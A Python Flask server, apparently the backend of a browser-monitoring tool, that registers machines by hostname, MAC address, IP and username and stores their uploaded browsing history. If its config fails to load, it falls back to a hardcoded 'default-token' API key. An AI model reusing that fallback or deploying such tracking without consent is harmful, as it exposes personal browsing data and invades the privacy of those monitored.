from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
from datetime import datetime
from database import BrowserTrackingDB
from logger import setup_logger

# Initialize logger
logger = setup_logger(__name__)

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# Load configuration
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Error loading config: {e}")
        return {
            "server": {"host": "0.0.0.0", "port": 5000},
            "security": {"api_token": "default-token"},
            "database": {"path": "browser_tracking.db"}
        }

config = load_config()
db = BrowserTrackingDB(config['database']['path'])

def verify_token(token):
    """Verify API token"""
    return token == config['security']['api_token']

@app.before_request
def authenticate():
    """Authenticate requests"""
    if request.endpoint in ['health']:
        return  # Skip auth for health check
    
    token = request.headers.get('Authorization')
    if not token or not token.startswith('Bearer '):
        return jsonify({'error': 'Missing or invalid authorization header'}), 401
    
    api_token = token.replace('Bearer ', '')
    if not verify_token(api_token):
        return jsonify({'error': 'Invalid API token'}), 401

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0'
    })

@app.route('/api/register', methods=['POST'])
def register_client():
    """Register a new client"""
    try:
        data = request.get_json()
        
        required_fields = ['hostname', 'mac_address', 'local_ip', 'username', 'os_info']
        if not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields'}), 400
        
        client_id = db.get_or_create_client(
            data['hostname'],
            data['mac_address'],
            data['local_ip'],
            data['username'],
            data['os_info']
        )
        
        if client_id:
            logger.info(f"Client registered: {data['hostname']} ({data['mac_address']})")
            return jsonify({
                'success': True,
                'client_id': client_id,
                'message': 'Client registered successfully'
            })
        else:
            return jsonify({'error': 'Failed to register client'}), 500
            
    except Exception as e:
        logger.error(f"Error registering client: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/browsing-data', methods=['POST'])
def submit_browsing_data():
    """Submit browsing history data"""
    try:
        data = request.get_json()
        
        if 'client_id' not in data or 'browsing_data' not in data:
            return jsonify({'error': 'Missing client_id or browsing_data'}), 400
        
        client_id = data['client_id']
        browsing_data = data['browsing_data']
        
        if not isinstance(browsing_data, list):
            return jsonify({'error': 'browsing_data must be a list'}), 400
        
        success = db.insert_browsing_data(client_id, browsing_data)
        
        if success:
            logger.info(f"Received {len(browsing_data)} browsing entries from client {client_id}")
            return jsonify({
                'success': True,
                'message': f'Processed {len(browsing_data)} entries'
            })
        else:
            return jsonify({'error': 'Failed to process browsing data'}), 500
            
    except Exception as e:
        logger.error(f"Error processing browsing data: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/profiles', methods=['POST'])
def submit_profiles():
    """Submit browser profiles data"""
    try:
        data = request.get_json()
        
        if 'client_id' not in data or 'profiles' not in data:
            return jsonify({'error': 'Missing client_id or profiles'}), 400
        
        client_id = data['client_id']
        profiles = data['profiles']
        
        success = db.update_browser_profiles(client_id, profiles)
        
        if success:
            logger.info(f"Updated profiles for client {client_id}")
            return jsonify({
                'success': True,
                'message': 'Profiles updated successfully'
            })
        else:
            return jsonify({'error': 'Failed to update profiles'}), 500
            
    except Exception as e:
        logger.error(f"Error updating profiles: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/activity', methods=['GET'])
def get_activity():
    """Get recent browsing activity"""
    try:
        hours = request.args.get('hours', 24, type=int)
        limit = request.args.get('limit', 1000, type=int)
        
        activity = db.get_recent_activity(hours, limit)
        
        return jsonify({
            'success': True,
            'activity': activity,
            'count': len(activity)
        })
        
    except Exception as e:
        logger.error(f"Error getting activity: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

# For Vercel deployment
app.config['ENV'] = 'production'

if __name__ == '__main__':
    server_config = config['server']

    logger.info(f"Starting Browser Tracking Server on {server_config['host']}:{server_config['port']}")

    # SSL configuration
    ssl_context = None
    if server_config.get('ssl_enabled', False):
        ssl_cert = server_config.get('ssl_cert')
        ssl_key = server_config.get('ssl_key')
        if ssl_cert and ssl_key and os.path.exists(ssl_cert) and os.path.exists(ssl_key):
            ssl_context = (ssl_cert, ssl_key)
            logger.info("SSL enabled")

    app.run(
        host=server_config['host'],
        port=server_config['port'],
        debug=server_config.get('debug', False),
        ssl_context=ssl_context
    )
